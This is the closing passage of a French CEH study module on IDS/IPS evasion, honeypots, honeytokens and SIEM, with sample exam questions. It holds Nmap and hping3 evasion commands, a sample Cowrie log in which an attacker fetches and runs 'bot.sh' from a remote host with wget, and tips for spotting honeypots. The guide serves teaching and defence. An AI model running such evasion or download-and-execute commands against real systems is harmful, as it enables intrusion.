→ Connexion vers C2 sur port 443 HTTPS
→ Ressemble à navigation web normale
→ IDS voit du HTTPS chiffré = indétectable
```

---

### 🔵 Évasion par Manipulation des Données

```bash
# Nmap avec padding aléatoire
sudo nmap -sS --data-length 25 192.168.1.10

# Nmap avec options IP supplémentaires
sudo nmap -sS --ip-options "L 192.168.1.1" 192.168.1.10

# Changer le TTL
sudo hping3 -S --ttl 128 -p 80 192.168.1.10
```

---

## 📌 PARTIE 8 : HONEYPOTS — PIÈGES À ATTAQUANTS

### 🔵 Qu'est-ce qu'un Honeypot ?

```
DÉFINITION :
Un honeypot est un SYSTÈME LEURRE conçu pour
attirer les attaquants, capturer leurs techniques,
et les étudier en toute sécurité.

PRINCIPE :
→ Ressemble à un vrai système vulnérable
→ Aucun accès légitime prévu
→ Toute activité = SUSPECTE par définition
→ Capture et analyse tout ce qui se passe

ANALOGIE :
Comme un pot de miel pour attraper des mouches.
Les attaquants sont attirés par les systèmes
vulnérables → le honeypot simule cette vulnérabilité.

VALEURS D'UN HONEYPOT :
├── Intelligence : comprendre les nouvelles attaques
├── Détection précoce : alerter sur intrusions réseau
├── Diversion : occuper les attaquants loin des vrais systèmes
└── Forensique : analyser les TTP des attaquants
```

---

### 🔵 Types de Honeypots

```
CLASSIFICATION PAR NIVEAU D'INTERACTION :
═══════════════════════════════════════════════════════════════

LOW-INTERACTION HONEYPOT :
├── Simule des services limités
├── Pas d'OS réel → risque minimal
├── Facile à déployer et maintenir
├── Capture : scans, tentatives de connexion
├── Ne capture PAS : comportement post-exploitation
└── EXEMPLES : Honeyd, Dionaea, Kippo, Cowrie

MEDIUM-INTERACTION HONEYPOT :
├── Simule plus de comportements
├── Peut simuler des réponses
├── Exemples : Glastopf (honeypot web)

HIGH-INTERACTION HONEYPOT :
├── Vrai OS, vrais services
├── Attaquant peut réellement compromettre
├── Capture tout : outils, techniques, C2
├── RISQUE : attaquant peut rebondir vers d'autres systèmes
├── Nécessite isolation stricte (VLAN, firewall)
└── EXEMPLES : Argos, machines physiques dédiées

HONEYNET :
├── Réseau complet de honeypots
├── Simule une infrastructure d'entreprise complète
├── Très riche en informations
└── Projet honeynet.org → recherche mondiale

HONEYTOKENS :
├── Faux documents/credentials/clés
├── Si utilisés → alerte immédiate
└── Ex: faux AWS credentials dans GitHub
    → Si appelés → compromission détectée !
```

---

### 🛠️ COWRIE — Honeypot SSH/Telnet interactif

**Cowrie** est l'un des honeypots les plus utilisés pour capturer les attaques SSH/Telnet.

```bash
# Installation Cowrie
git clone https://github.com/cowrie/cowrie
cd cowrie
virtualenv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt

# Configuration
cp etc/cowrie.cfg.dist etc/cowrie.cfg

# Configurer le port d'écoute
# Default SSH port 2222 (redirection iptables depuis 22)
iptables -t nat -A PREROUTING -p tcp --dport 22 \
         -j REDIRECT --to-port 2222

# Lancer Cowrie
bin/cowrie start
```

**Logs Cowrie quand un attaquant se connecte :**
```
2024-11-15T20:00:12+0200 [cowrie.ssh.factory.CowrieSSHFactory]
    New connection: 192.168.1.5:47821 (192.168.1.10:22) [session: b33f1234]

2024-11-15T20:00:13+0200 [HoneyPotSSHTransport,0,192.168.1.5]
    Remote SSH version: SSH-2.0-libssh2_1.10.0

2024-11-15T20:00:14+0200 [HoneyPotSSHTransport,0,192.168.1.5]
    login attempt [b'root'/b'root'] failed

2024-11-15T20:00:14+0200 [HoneyPotSSHTransport,0,192.168.1.5]
    login attempt [b'root'/b'admin'] failed

2024-11-15T20:00:14+0200 [HoneyPotSSHTransport,0,192.168.1.5]
    login attempt [b'root'/b'123456'] failed

2024-11-15T20:00:15+0200 [HoneyPotSSHTransport,0,192.168.1.5]
    login attempt [b'root'/b'toor'] succeeded

2024-11-15T20:00:15+0200 [HoneyPotSSHTransport,0,192.168.1.5]
    New environment:
    TERM=xterm-256color
    LANG=en_US.UTF-8

2024-11-15T20:00:16+0200 [SSHChannel,0,192.168.1.5]
    CMD: id

2024-11-15T20:00:16+0200 [SSHChannel,0,192.168.1.5]
    Command found: id

2024-11-15T20:00:17+0200 [SSHChannel,0,192.168.1.5]
    CMD: uname -a

2024-11-15T20:00:18+0200 [SSHChannel,0,192.168.1.5]
    CMD: wget http://192.168.100.50/bot.sh

2024-11-15T20:00:18+0200 [SSHChannel,0,192.168.1.5]
    Downloading URL (http://192.168.100.50/bot.sh)
    to bot.sh

2024-11-15T20:00:19+0200 [SSHChannel,0,192.168.1.5]
    CMD: chmod +x bot.sh && ./bot.sh

2024-11-15T20:00:20+0200 [SSHChannel,0,192.168.1.5]
    Captured file: /tmp/bot.sh
    Hash: sha256=a1b2c3d4e5f6...

2024-11-15T20:00:35+0200 [SSHChannel,0,192.168.1.5]
    Connection lost after 22 seconds
```

**Analyse des données capturées :**
```
INFORMATIONS COLLECTÉES :
├── IP attaquant : 192.168.1.5
├── Mots de passe testés : root, admin, 123456, toor
├── Mot de passe ayant fonctionné : toor (dans le honeypot)
├── Commandes exécutées : id, uname -a, wget, chmod, execute
├── Serveur C2 : http://192.168.100.50/
├── Malware téléchargé : bot.sh (capturé pour analyse !)
└── Durée : 22 secondes

→ Analyse du bot.sh révèle l'infrastructure du botnet !
→ Signalement possible aux autorités avec preuves
```

---

### 🛠️ T-POT — Suite complète de honeypots

**T-Pot** est une plateforme qui combine 20+ honeypots différents.

```
T-POT HONEYPOTS INCLUS :
═══════════════════════════════════════════════════════════════

Service     Honeypot       Port(s)
────────    ─────────      ────────
SSH/Telnet  Cowrie         22, 23
FTP         Pure-FTPd      21
HTTP        Glastopf       80, 8080
HTTPS       Nginx leurre   443
SMB         Dionaea        139, 445
MySQL       MySQL honeypot 3306
RDP         RDPY           3389
VNC         HoneySpy       5900
SMTP        Mailoney       25
DNS         Dnspot         53
Industrial  Conpot (SCADA) 102, 502
SNMP        SNMP honeypot  161
Elastic     ElasticHoney   9200
Redis       Redis honeypot 6379
```

---

### 🔵 Comment détecter un honeypot (perspective défensive)

```
INDICATEURS QU'UN SYSTÈME EST UN HONEYPOT :
(Pour les pentesters qui veulent éviter de perdre du temps
 et pour les défenseurs qui veulent mieux les camoufler)

═══════════════════════════════════════════════════════════════

INDICATEURS TECHNIQUES :

1. TEMPS DE RÉPONSE UNIFORME :
   → Les honeypots simulent des réponses → délais artificiels
   → Les vrais services ont des variations naturelles

2. ÉMULATION TROP PARFAITE :
   → Certains honeypots répondent à TOUT
   → Un vrai serveur SSH refuse des commandes inconnues
   → Le honeypot peut accepter n'importe quoi

3. FILESYSTEM INCOMPLET :
   → Low-interaction honeypot : /etc/passwd très court
   → Pas de fichiers logs historiques
   → Processus en cours minimaux

4. RÉPONSES GÉNÉRIQUES :
   → Même version affichée pour des services différents
   → Bannières identiques entre machines

5. PATTERN DANS LE RÉSEAU :
   → Machine avec plein de ports ouverts différents
   → Ports ouverts qui n'auraient aucune logique ensemble
   → SSH + RDP + Telnet + FTP + MySQL sur même machine ?

6. DÉTECTION COWRIE SPÉCIFIQUE :
   → Cowrie a des tells connus :
   → Commande "exit" reconnectée automatiquement
   → Certains binaires ont des comportements fixes
   → Le filesystem est readonly pour certaines ops

═══════════════════════════════════════════════════════════════

HONEYTOKENS — DÉTECTER LES ATTAQUANTS VIA LEURRES :

HONEY CREDENTIALS dans des fichiers :
config.php contient : db_password = "HoneyToken_12345"
→ Si cette valeur apparaît dans un login réel → alerte !

HONEY DOCUMENTS :
"Rapport_Salaires_Confidentiel.pdf" en accès partagé
→ Si ouvert par quelqu'un d'autre → alerte !

HONEY AWS KEYS :
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7HONEYTOKEN"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYHONEYTOKEN"
→ Si utilisées → alerte immédiate (AWS envoie notification)
→ Compromise GitHub = détection automatique

HONEY URLs :
Lien caché dans le HTML, invisible visuellement :
<a href="/admin/secret-honeypot-url" style="display:none">
→ Si visité → bot ou attaquant détecté !
```

---

## 📌 PARTIE 9 : SIEM — CENTRALISATION ET CORRÉLATION

```
SIEM (Security Information and Event Management)
Centralise TOUS les logs et CORRÈLE les événements.

SOURCES D'ALIMENTATION :
├── IDS/IPS (Snort, Suricata)
├── Firewalls (Cisco, Palo Alto, Fortinet)
├── HIDS (Wazuh, OSSEC)
├── Serveurs (Windows Event Logs, Linux syslog)
├── Applications (Apache, nginx, MySQL)
├── Authentification (Active Directory, LDAP)
└── Honeypots

RÈGLES DE CORRÉLATION EXEMPLE :

Règle 1 : "Scan puis exploitation"
IF (scan détecté depuis IP X dans les 5 dernières minutes)
AND (connexion établie depuis IP X vers port scanné)
THEN alerte "Probable exploitation post-scan" [CRITIQUE]

Règle 2 : "Bruteforce puis succès"
IF (>10 échecs auth depuis IP X en 60s)
AND (succès auth depuis IP X)
THEN alerte "Bruteforce réussi" [CRITIQUE]

Règle 3 : "Mouvement latéral"
IF (connexion de WORKSTATION vers SERVEUR sur port 445)
AND (connexion de SERVEUR vers autre SERVEUR sur port 445)
THEN alerte "Possible mouvement latéral SMB" [HAUT]

EXEMPLES DE SIEM :
├── Splunk (commercial, le plus utilisé)
├── ELK Stack (Elasticsearch + Logstash + Kibana) - Open Source
├── IBM QRadar
├── Microsoft Sentinel (Azure)
└── AlienVault OSSIM (open source)
```

---

## 📌 RÉSUMÉ FINAL — CE QUE L'EXAMEN VA TESTER

```
✅ IDS vs IPS — passif/actif, position, action
✅ NIDS vs HIDS — différences, exemples, limites
✅ Détection par signature vs anomalie vs heuristique
✅ Snort — modes, structure règle complète, options
✅ Suricata vs Snort — avantages Suricata
✅ Zeek — framework d'analyse comportementale
✅ Types de firewalls — packet filter, stateful, proxy, NGFW, WAF
✅ Table d'état firewall — connexions établies
✅ Évasion par fragmentation — -f dans Nmap
✅ Évasion par Decoy — -D dans Nmap
✅ Évasion par timing — -T0 à -T5
✅ Évasion par port source — --source-port 53
✅ URL obfuscation WAF bypass — encodage, comments, case
✅ DNS/ICMP/HTTP tunneling — principe et outils
✅ Honeypot low vs high interaction
✅ Cowrie — honeypot SSH, ce qu'il capture
✅ T-Pot — suite multi-honeypots
✅ Honeytokens — leurres pour détecter les attaquants
✅ Indicateurs d'un honeypot — comment les identifier
✅ SIEM — corrélation d'événements multi-sources
```

---

## 🧪 QUESTIONS TYPE EXAMEN CEH — MODULE 12

**Q1 :** Quelle différence fondamentale entre IDS et IPS ?
> **Réponse : IDS (passif) = détecte et alerte seulement, placé hors du flux (copie miroir). IPS (actif/inline) = dans le flux de trafic, bloque automatiquement les attaques sans intervention humaine. L'IPS ajoute de la latence mais réagit immédiatement.**

**Q2 :** Pourquoi la détection par signature ne peut-elle pas détecter les attaques zero-day ?
> **Réponse : La détection par signature compare le trafic à une base de patterns d'attaques CONNUES. Un zero-day est par définition une attaque inconnue → aucune signature n'existe → indétectable. Seule la détection par anomalie peut potentiellement détecter un zero-day via comportement anormal.**

**Q3 :** Comment l'évasion par fragmentation trompe un IDS ?
> **Réponse : L'IDS doit réassembler les fragments pour analyser le contenu complet. Si l'IDS ne réassemble pas les fragments avant analyse, l'attaquant peut fractionner un payload ("UNION SELECT" → "UNI"+"ON "+"SEL"+"ECT") — chaque fragment seul est inoffensif, mais la cible les réassemble en payload complet.**

**Q4 :** Pourquoi utiliser --source-port 53 dans Nmap peut contourner certains firewalls ?
> **Réponse : Des firewalls mal configurés autorisent tout le trafic depuis le port 53 (DNS) pensant que ce sont des réponses DNS légitimes. Un attaquant utilisant le port 53 comme source fait passer son trafic pour du DNS.**

**Q5 :** Qu'est-ce qu'un honeytoken et donner deux exemples ?
> **Réponse : Un honeytoken est un leurre numérique qui alerte quand il est utilisé/consulté. Exemples : (1) Fausses clés AWS dans un dépôt GitHub — si utilisées, AWS alerte. (2) Faux document "Salaires_Confidentiels.pdf" sur un partage réseau — si ouvert, IDS alerte sur compromission.**

**Q6 :** Quelle différence entre un honeypot low-interaction et high-interaction ?
> **Réponse : Low-interaction = simule des services limités, pas d'OS réel, risque minimal, capture seulement les scans/tentatives. High-interaction = vrai OS et vrais services, l'attaquant peut vraiment compromettre, capture les TTP complets (outils, malware, C2) mais risque de rebond si mal isolé.**

**Q7 :** Quelle règle Snort détecter un scan de port par SYN flood ?
> **Réponse : `alert tcp any any -> $HOME_NET any (flags:S,12; threshold:type threshold, track by_src, count 20, seconds 5; msg:"Port Scan Detected"; sid:1;)` — détecte plus de 20 SYN depuis la même source en 5 secondes.**

**Q8 :** Qu'est-ce que le DNS tunneling et comment le détecter ?
> **Réponse : Encapsuler des données dans des requêtes DNS pour bypasser les firewalls (port 53 généralement ouvert). Détection : requêtes DNS avec sous-domaines anormalement longs (>50 caractères), volume anormal de requêtes DNS vers un domaine, requêtes de type TXT/NULL inhabituelles, même domaine contacté des centaines de fois.**

**Q9 :** Comment un NGFW diffère-t-il d'un firewall stateful classique ?
> **Réponse : Le NGFW ajoute : application awareness (identifie l'app au-delà du port), user identity (règles par utilisateur via AD), SSL/TLS inspection (déchiffre le HTTPS pour l'inspecter), IPS intégré, URL filtering, et threat intelligence en temps réel. Le stateful ne voit que les connexions réseau sans comprendre le contenu.**

**Q10 :** Quels sont les indicateurs techniques qui révèlent qu'un système est un honeypot ?
> **Réponse : Temps de réponse uniformes et artificiels, filesystem incomplet (peu de fichiers historiques, /etc/passwd court), tous les ports ouverts simultanément (illogique), réponses génériques identiques, services hétéroclites incompatibles sur même machine (SSH + RDP + Telnet + SCADA), comportements fixes non réalistes.**

---

> **Module 12 terminé. **
